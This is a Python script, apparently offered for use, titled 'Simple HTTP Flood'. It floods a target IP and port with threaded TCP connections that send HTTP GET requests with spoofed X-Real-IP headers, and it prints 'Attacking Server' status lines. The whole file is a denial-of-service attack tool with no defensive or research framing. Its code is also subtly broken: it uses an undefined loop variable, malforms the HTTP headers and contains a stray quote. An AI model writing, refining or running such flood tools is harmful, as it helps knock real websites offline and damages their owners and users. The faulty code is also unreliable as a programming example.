import socket, random, sys, threading, os

if os.name == 'posix':
  os.system('clear')
elif os.name == 'nt':
  os.system('cls')

logo = """\033[1;35m
                                                     
                                                     
                                                     
                                                     
                                                     
                       .iJU2s7.                      
    dQZSuYvi.       iQBBbLri7jPgg7                   
    2BBBBM77ri:.  iBQv   .ivvvrr7bQL                 
      SBBS       EBL  JBBQBQBBBQQX5BQ                
        7BBS    dB  sBBBgMDMDgDMgQQgQB               
          iBBQ::B. DBRMDDZDZDEDZgDgDQBs              
             vRBQ.JBQRDgZgEgZDZgZDZggBB              
                 2BBBQQggZgDgZgZDZDZgQB              
               S7   .XBBQBRMggZgZDZggBQ              
               iB:Kv    rPBBBBQgMDgZQBv  .i          
                PBuBBBI.    rZBBBBQQBP    .SP        
                 XBBBBBBBQu.    iqBQB.      rBE.     
                  :QBBBBQBBBBBXr.  .rDBBBQqUXBBBR.   
                    .UBQBBBBBBBBBi      :YdQBBBBBB   
                        .::i:.                       
                        
                  Simple HTTP Flood
                     By : MrSanZz
"""

try:
    print(logo)
    print('\n')
    ip = str(sys.argv[1])
    port = int(sys.argv[2])
    thd = int(sys.argv[3])
    def floods():
        ang = ['1','2','3','4','5','6','7','8','9','0']
        n1 = random.choice(ang)
        n2 = random.choice(ang)
        n3 = random.choice(ang)
        n4 = random.choice(ang)
        n5 = random.choice(ang)
        n6 = random.choice(ang)
        n7 = random.choice(ang)
        fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.sendto(("GET / HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
            s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (ip,port))
            s.sendto(("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'").encode('ascii'), (ip,port))
            s.sendto(("Connection: keep-alive\r\n\r\n").encode('ascii'), (ip,port))
            s.sendto(("X-Real-IP: "+fip+"\r\n").encode('ascii'), (ip,port))
            s.close()
            print(f"Attacking Server | {ip}:{port} Sent : ", i, f" With Proxy : {fip}", end='\r')
        except TimeoutError:
            print("Timeout  ", end='\r')
        except ConnectionResetError:
            print("Reseted  ", end='\r')
        except ConnectionAbortedError:
            print("Error    ", end='\r')
        except ConnectionRefusedError:
            print("Refused  ", end='\r')
        except ConnectionError:
            print("Check Your Connection ", end='\r')
    for i in range(thd):
        t = threading.Thread(target=floods)
        t.start()
except IndexError:
    print('\n')
    print('[!] Usage : python3 flood.py <ip> <port> <thread count> [!]')
except TimeoutError:
    print("TIMEOUT ", end='\r')
